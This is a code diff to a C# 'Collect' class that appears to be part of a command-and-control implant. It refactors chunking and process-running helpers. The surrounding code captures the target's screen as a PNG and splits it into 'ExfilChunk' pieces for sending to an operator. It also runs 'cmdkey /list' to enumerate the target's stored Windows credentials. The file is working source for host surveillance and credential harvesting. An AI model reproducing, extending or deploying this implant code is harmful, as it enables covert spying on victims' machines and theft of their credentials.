@@ -64,11 +64,6 @@ internal static class Collect
             : (TaskOutcome.Succeeded, string.Join("\n", lines), Array.Empty<ExfilChunk>());
     }
 
-    // The size of each ExfilChunk data payload for a streamed screenshot,
-    // matching the exfil and file-pull chunk sizes (512 KiB) so every
-    // artifact stream crosses the wire at the same ceiling.
-    private const int ChunkSize = 512 * 1024;
-
     /// <summary>
     /// Captures the target's display and returns it as a PNG artifact: the
     /// frame is captured over the standard desktop-capture APIs (GDI on
@@ -105,7 +100,7 @@ internal static class Collect
         var name = "screenshot-"
                    + DateTime.UtcNow.ToString("yyyyMMdd'T'HHmmss'Z'", CultureInfo.InvariantCulture)
                    + ".png";
-        var chunks = Chunking.ChunkFile(name, "image/png", png, ChunkSize);
+        var chunks = Chunking.ChunkFile(name, "image/png", png, Chunking.StreamChunkBytes);
         return (TaskOutcome.Succeeded,
             $"captured {screen.Width}x{screen.Height} {name}: {png.Length} bytes, {chunks.Count} chunks",
             chunks);
@@ -257,7 +252,7 @@ internal static class Collect
     [SupportedOSPlatform("windows")]
     private static IEnumerable<string> CollectCmdkey()
     {
-        var (outcome, output) = RunCaptured("cmdkey", "/list");
+        var (outcome, output) = NativeCommand.RunCaptured("cmdkey", "/list");
         if (outcome == TaskOutcome.Failed)
         {
             yield return $"cmdkey (listing failed: {output})";
@@ -295,38 +290,5 @@ internal static class Collect
                 return home;
         }
         return Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
-    }
-
-    // Runs a platform command, capturing combined stdout/stderr. A non-zero
-    // exit is Failed with the output captured so the operator sees the cause.
-    private static (TaskOutcome Outcome, string Output) RunCaptured(string fileName, string arguments)
-    {
-        var psi = new ProcessStartInfo
-        {
-            FileName = fileName,
-            Arguments = arguments,
-            UseShellExecute = false,
-            RedirectStandardOutput = true,
-            RedirectStandardError = true,
-            CreateNoWindow = true,
-        };
-        try
-        {
-            using var process = Process.Start(psi);
-            if (process is null)
-                return (TaskOutcome.Failed, $"failed to start {fileName}");
-            var stdout = process.StandardOutput.ReadToEnd();
-            var stderr = process.StandardError.ReadToEnd();
-            process.WaitForExit();
-            if (stdout.Length == 0)
-                return (process.ExitCode == 0 ? TaskOutcome.Succeeded : TaskOutcome.Failed, stderr);
-            if (stderr.Length == 0)
-                return (process.ExitCode == 0 ? TaskOutcome.Succeeded : TaskOutcome.Failed, stdout);
-            return (process.ExitCode == 0 ? TaskOutcome.Succeeded : TaskOutcome.Failed, stdout + "\n" + stderr);
-        }
-        catch (Exception ex)
-        {
-            return (TaskOutcome.Failed, ex.Message);
-        }
     }
 }
